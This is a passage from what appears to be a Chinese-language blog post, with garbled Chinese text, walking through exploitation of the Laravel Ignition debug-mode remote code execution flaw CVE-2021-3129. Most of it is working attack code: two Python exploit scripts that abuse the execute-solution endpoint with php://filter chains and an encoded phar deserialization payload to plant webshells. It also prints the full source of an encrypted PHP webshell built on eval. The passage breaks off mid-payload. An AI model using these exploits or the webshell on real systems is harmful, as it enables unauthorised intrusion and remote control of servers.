punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"webshellåœ°å€:"</span><span class="token operator">+</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/fuckyou.php,å¯†ç :pass"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]æ¼æ´ä¸å­˜åœ¨"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python exp.py http://192.168.52.3:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.24.43.png" alt="ä½¿ç”¨exp" style="zoom:50%;"><p>webshellåœ°å€:<a href="http://192.168.52.3:8080/fuckyou.php,%E5%AF%86%E7%A0%81:pass">http://192.168.52.3:8080/fuckyou.php,å¯†ç :pass</a></p><p>èšå‰‘è¿æ¥getshellï¼š</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.26.46.png" style="zoom:50%;"><p>æŸ¥çœ‹å†™å…¥çš„æœ¨é©¬ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">E</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&amp;</span> <span class="token number">15</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span><span class="token variable">$D</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">Q</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">O</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$P</span><span class="token operator">=</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">;</span><span class="token variable">$V</span><span class="token operator">=</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">;</span><span class="token variable">$T</span><span class="token operator">=</span><span class="token string single-quoted-string">'3c6e0b8a9c15224a'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$P</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$F</span><span class="token operator">=</span><span class="token function">O</span><span class="token punctuation">(</span><span class="token function">E</span><span class="token punctuation">(</span><span class="token function">O</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$P</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$T</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$V</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$L</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$V</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$A</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$L</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">nvoke</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$R</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$R</span><span class="token operator">-&gt;</span><span class="token function">nvoke</span><span class="token punctuation">(</span><span class="token variable">$A</span><span class="token punctuation">[</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token operator">.</span><span class="token variable">$T</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token number">16</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">Q</span><span class="token punctuation">(</span><span class="token function">E</span><span class="token punctuation">(</span>@<span class="token function">run</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$T</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token operator">.</span><span class="token variable">$T</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$V</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$F</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æµ‹è¯•æ—¶å‘ç°å¦‚ä¸‹é—®é¢˜ï¼ˆæ— æ³•è¿æ¥shellï¼‰ã€‚</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.32.35.png" style="zoom:50%;"><p>å¯èƒ½æ˜¯æœ¨é©¬åŠ è§£å¯†å¯¼è‡´çš„ã€‚</p><p>å¦‚æœæƒ³ç®€å•çš„å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œåªéœ€è¦æ›¿æ¢sendpayloadlinuxæˆ–sendpayloadwindowså‡½æ•°ä¸­çš„viewFileå€¼å³å¯ã€‚</p><h2 id="4-2-exp2-å†™å…¥ä¸€å¥è¯æœ¨é©¬"><a href="#4-2-exp2-å†™å…¥ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="4.2 exp2-å†™å…¥ä¸€å¥è¯æœ¨é©¬"></a>4.2 exp2-å†™å…¥ä¸€å¥è¯æœ¨é©¬</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/user/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># Laravel Debug mode RCEï¼ˆCVE-2021-3129ï¼‰</span><span class="token keyword">import</span> json<span class="token keyword">import</span> requests<span class="token keyword">import</span> argparse<span class="token keyword">import</span> sys<span class="token keyword">import</span> reheader <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"</span><span class="token punctuation">,</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">}</span><span class="token comment"># å¸®åŠ©</span><span class="token keyword">def</span> <span class="token function">cmd_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    parse <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>        description<span class="token operator">=</span><span class="token string">"Laravel Debug mode RCEï¼ˆCVE-2021-3129ï¼‰POC &amp; EXP"</span><span class="token punctuation">,</span>  <span class="token comment"># æè¿°</span>        usage<span class="token operator">=</span><span class="token string">"python CVE-2021-3129.py -u [url] --exp"</span><span class="token punctuation">,</span>  <span class="token comment"># ä½¿ç”¨æ–¹æ³•</span>        add_help<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token comment"># å¼€å¯å¸®åŠ©</span>    <span class="token punctuation">)</span>    parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span> <span class="token string">'--url'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"æŒ‡å®šç›®æ ‡urlåœ°å€"</span><span class="token punctuation">)</span>    parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-e'</span><span class="token punctuation">,</span> <span class="token string">'--exp'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"åˆ©ç”¨æ¼æ´å†™å…¥webshellï¼Œå¦‚ä¸æŒ‡å®šï¼Œåˆ™ä»…è¿›è¡Œæ¼æ´æ£€æµ‹"</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">)</span>    parse<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--proxy'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"è®¾ç½®ä»£ç†ï¼Œå¦‚socks5://127.0.0.1:7890"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        sys<span class="token punctuation">.</span>argv<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'-h'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> parse<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># æ¼æ´æ£€æµ‹</span><span class="token keyword">def</span> <span class="token function">bug_poc</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> target_url<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">:</span>        target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">"/_ignition/execute-solution"</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        clear_log<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span>        clear_log<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span>        <span class="token keyword">if</span> send_aa<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> send_poc_linux<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> filter_log<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> phar_ser_linux<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> get_path<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span>                    <span class="token keyword">if</span> result<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                        html <span class="token operator">=</span> result<span class="token punctuation">.</span>text                        pattern1 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>                            <span class="token string">r'&lt;title&gt;PHP (.*?) - phpinfo\(\)&lt;/title&gt;&lt;meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /&gt;&lt;/head&gt;'</span><span class="token punctuation">)</span>                        php_version <span class="token operator">=</span> pattern1<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                        pattern2 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;tr&gt;&lt;td class="e"&gt;System &lt;/td&gt;&lt;td class="v"&gt;(.*?)&lt;/td&gt;&lt;/tr&gt;'</span><span class="token punctuation">)</span>                        system_info <span class="token operator">=</span> pattern2<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                        pattern3 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>                            <span class="token string">r'&lt;tr&gt;&lt;td class="e"&gt;\$_SERVER\[\'DOCUMENT_ROOT\'\]&lt;/td&gt;&lt;td class="v"&gt;(.*?)&lt;/td&gt;&lt;/tr&gt;'</span><span class="token punctuation">)</span>                        document_root <span class="token operator">=</span> pattern3<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                        pattern4 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>                            <span class="token string">r'&lt;tr&gt;&lt;td class="e"&gt;\$_SERVER\[\'SERVER_ADDR\'\]&lt;/td&gt;&lt;td class="v"&gt;(.*?)&lt;/td&gt;&lt;/tr&gt;'</span><span class="token punctuation">)</span>                        server_addr <span class="token operator">=</span> pattern4<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[âœ…]æ£€æµ‹åˆ°æ¼æ´ï¼[ğŸš©]url: {0} [â‡ï¸info]PHPç‰ˆæœ¬:{1} ç½‘ç«™è·¯å¾„:{2} æœåŠ¡å™¨åœ°å€:{3} ç³»ç»Ÿç‰ˆæœ¬:{4}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span>                                                                                                           php_version<span class="token punctuation">,</span>                                                                                                           document_root<span class="token punctuation">,</span>                                                                                                           server_addr<span class="token punctuation">,</span>                                                                                                           system_info<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!]æœªæ£€æµ‹åˆ°æ¼æ´ [x]url: {0}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æ¼æ´åˆ©ç”¨</span><span class="token keyword">def</span> <span class="token function">bug_exp</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> target_url<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">:</span>        target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">"/_ignition/execute-solution"</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        clear_log<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span>        clear_log<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span>        <span class="token keyword">if</span> send_aa<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> send_payload_linux<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> filter_log<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> phar_ser_linux<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> get_path<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target_url <span class="token operator">+</span> <span class="token string">"/shell.php"</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>                            <span class="token string">"http"</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>                            <span class="token string">"https"</span><span class="token punctuation">:</span> proxy_server                        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[OK] æˆåŠŸå†™å…¥webshell, è®¿é—®åœ°å€ {0}/shell.php , å¯†ç  whoami"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!]å†™å…¥webshellå¤±è´¥"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    args <span class="token operator">=</span> cmd_line<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> args<span class="token punctuation">.</span>proxy<span class="token punctuation">:</span>        proxy_server <span class="token operator">=</span> args<span class="token punctuation">.</span>proxy    <span class="token keyword">else</span><span class="token punctuation">:</span>        proxy_server <span class="token operator">=</span> <span class="token boolean">None</span>    target_url <span class="token operator">=</span> args<span class="token punctuation">.</span>url    bug_result <span class="token operator">=</span> bug_poc<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span>    <span class="token keyword">if</span> args<span class="token punctuation">.</span>exp <span class="token keyword">and</span> bug_result<span class="token punctuation">:</span>        bug_exp<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">clear_log</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span>        <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"username"</span><span class="token punctuation">,</span>            <span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token comment"># æŒ‡å®š http å’Œ https èµ°ä»€ä¹ˆä»£ç†</span>        <span class="token string">"http"</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>        <span class="token string">"https"</span><span class="token punctuation">:</span> proxy_server    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token keyword">def</span> <span class="token function">send_aa</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span>        <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"username"</span><span class="token punctuation">,</span>            <span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"AA"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token comment"># æŒ‡å®š http å’Œ https èµ°ä»€ä¹ˆä»£ç†</span>        <span class="token string">"http"</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>        <span class="token string">"https"</span><span class="token punctuation">:</span> proxy_server    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token keyword">def</span> <span class="token function">send_payload_linux</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span>        <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"username"</span><span class="token punctuation">,</span>            <span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=52=00=41=00=67=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=62=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=